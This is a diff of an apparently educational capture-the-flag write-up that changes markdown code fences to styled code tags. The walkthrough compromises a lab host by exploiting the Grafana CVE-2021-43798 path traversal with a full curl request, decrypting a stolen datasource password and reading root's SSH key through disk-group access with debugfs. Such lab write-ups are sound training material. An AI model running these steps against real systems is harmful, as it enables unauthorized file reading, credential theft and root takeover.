@@ -21,8 +21,7 @@ featured: true
 
 We start the enumeration process with a simple Nmap scan:
 
-```
-┌──(kali㉿kali)-[~]
+<code style="background:black">┌──(kali㉿kali)-[~]
 └─$ nmap 192.168.146.150
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-28 14:10 IST
 Nmap scan report for 192.168.146.150
@@ -34,7 +33,7 @@ PORT     STATE SERVICE
 9090/tcp open  zeus-admin
 
 Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds
-```
+</code>
 
 We find ports `22`, `3000`, `9090` are open.
 
@@ -52,18 +51,18 @@ https://www.exploit-db.com/exploits/50581
 
 Using the python script it was possible to read the `/etc/grafana/grafana.ini` configuration file.
 
-```
+<code style="background:black">
 python3 exploit.py -H http://192.168.146.142:3000
 Read file > /etc/grafana/grafana.ini
-```
+</code>
 
 After checking the configuration file there are credentials for the admin.
 
-```
+<code style="background:black">
 ;admin_user = admin
 # default admin password, can be changed before first start of grafana, or in profile settings
 ;admin_password = admin
-```
+</code>
 
 After trying those credentials, they turned out invalid. These credentials are default credentials for grafana.
 
@@ -71,16 +70,16 @@ After searching for exploits in github, i stumbled upon https://github.com/jas50
 
 So using curl download the grafana.db file
 
-```
+<code style="background:black">
 curl --path-as-is http://192.168.146.142:3000/public/plugins/alertGroups/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
-```
+</code>
 
 Going through the database there is `data_source` table which contains basic_auth_user and secure_json_data which has basicAuthPassword
 
-```
+<code style="background:black">
 basic_auth_user = sysadmin
 basicAuthPassword = YUVmMzI1V2tnnPyo8o9LU3AFB/eWCSHdwwrOSyzEuj8u8dInddOHifuDUg==
-```
+</code>
 
 - But the password is encrypted. To decrypt the password we need a secret key according to https://github.com/jas502n/Grafana-CVE-2021-43798
 
@@ -105,13 +104,13 @@ Now run the go file to decrypt
 
 `go run <file-name>`
 
-```
+<code style="background:black">
 ┌──(kali㉿kali)-[~]
 └─$  go run decrypt.go
 [*] grafanaIni_secretKey= SW2YcwTIb9zpOOhoPsMm
 [*] DataSourcePassword= YUVmMzI1V2tnnPyo8o9LU3AFB/eWCSHdwwrOSyzEuj8u8dInddOHifuDUg==
 [*] plainText= SuperSecureP@ssw0rd
-```
+</code>
 
 - Since the user inside the datasource is sysadmin and we have the decrypted password now, let us check whether there has been reuse of password
 
@@ -121,10 +120,10 @@ Now run the go file to decrypt
 
 - As an initial step, let us find out the user and group names of the user
 
-```bash
+<code style="background:black">
 $ id
 uid=1002(sysadmin) gid=1002(sysadmin) groups=1002(sysadmin),6(disk)
-```
+</code>
 
 - We notice the disk group, Let us try privilege escalation throgh disk group
 
@@ -132,7 +131,7 @@ uid=1002(sysadmin) gid=1002(sysadmin) groups=1002(sysadmin),6(disk)
 
 - We exploit the disk group privileges to read root user’s private SSH key
 
-```bash
+<code style="background:black">
 $ df -h
 Filesystem      Size  Used Avail Use% Mounted on
 udev            1.9G     0  1.9G   0% /dev
@@ -149,24 +148,25 @@ tmpfs           2.0G     0  2.0G   0% /sys/fs/cgroup
 /dev/sda1       511M  4.0K  511M   1% /boot/efi
 tmpfs           390M   24K  390M   1% /run/user/1000
 tmpfs           390M  8.0K  390M   1% /run/user/1002
-```
+</code>
 
 Use debugfs to read the files in the partition
 
 > DebugFS is a simple-to-use RAM-based file system specially designed for debugging purposes. It can be used to access files within a given partition
 
-```
+<code style="background:black">
 $ debugfs /dev/sda5
 debugfs:  cd /root/.ssh
 debugfs:  cat id_rsa
-```
+</code>
 
 - Since we can read the contents inside the root directory, read root private SSH key
 - After obtaining the root private SSH key, we’ll login to the system via SSH as root
 
-```
+<code style="background:black">
 ssh -i id_rsa root@localhost
-```
+</code
+
 ### References
 
 * [Grafana 8.3.0 - Directory Traversal and Arbitrary File Read](https://www.exploit-db.com/exploits/50581)
